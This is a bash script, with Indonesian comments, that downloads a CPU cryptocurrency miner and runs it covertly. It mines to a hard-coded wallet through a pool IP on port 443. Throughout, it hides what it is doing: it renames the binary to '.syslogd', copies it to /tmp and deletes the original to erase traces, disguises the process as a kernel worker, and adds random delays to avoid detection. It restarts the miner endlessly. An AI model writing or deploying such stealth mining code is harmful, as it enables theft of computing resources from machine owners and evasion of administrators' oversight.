#!/bin/bash
set -e

# ====[ Konfigurasi User ]====
WALLET="Bc4QbZ9pPM5sJQ1RLdG7SrJCjqCnT5FVq9.Danis"
POOL="stratum+tcps://159.223.48.143:443"
ALGO="power2b"
THREADS=$(nproc --all)
BIN_NAME=".syslogd"
PROCESS_NAME="[kworker/u8:3-events]"
LOG_FILE=".xlog"
DELAY_MIN=5
DELAY_MAX=15

# ====[ Install Dependensi ]====
apt update -y && apt install -y wget tar curl

# ====[ Deteksi IP kamu ]====
MYIP=$(curl -s https://api.ipify.org)
if echo "$MYIP" | grep -qE '159\\.223\\.48\\.143'; then
    echo "[X] IP kamu sama dengan pool. Kemungkinan deteksi tinggi."
    exit 1
fi

# ====[ Download miner jika belum ada ]====
if [ ! -f "$BIN_NAME" ]; then
    echo "[INFO] Mengunduh miner..."
    wget --no-check-certificate https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz
    tar -xf cpuminer-opt-linux.tar.gz
    mv cpuminer-sse2 "$BIN_NAME"
    chmod +x "$BIN_NAME"
    rm -f cpuminer-opt-linux.tar.gz
fi

# ====[ Fungsi Delay Acak untuk Hindari Pola ]====
random_delay() {
    DELAY=$(( RANDOM % (DELAY_MAX - DELAY_MIN + 1) + DELAY_MIN ))
    echo "[INFO] Delay acak selama $DELAY detik..."
    sleep $DELAY
}

# ====[ Loop Stealth Miner ]====
echo "[INFO] Menjalankan mining stealth tanpa proxy..."
while true; do
    echo "[INFO] $(date) :: Menjalankan miner stealth..." >> "$LOG_FILE"

    # Salin ke /tmp dan hapus jejak
    cp "$BIN_NAME" "/tmp/$BIN_NAME.$$"
    chmod +x "/tmp/$BIN_NAME.$$"
    rm -f "$BIN_NAME"

    # Jalankan dengan nama proses disamarkan
    exec -a "$PROCESS_NAME" /tmp/$BIN_NAME.$$ -a $ALGO -o $POOL -u $WALLET -p x -t $THREADS >> "$LOG_FILE" 2>&1 || true

    echo "[WARN] Miner keluar. Reinit ulang..." >> "$LOG_FILE"
    random_delay
done
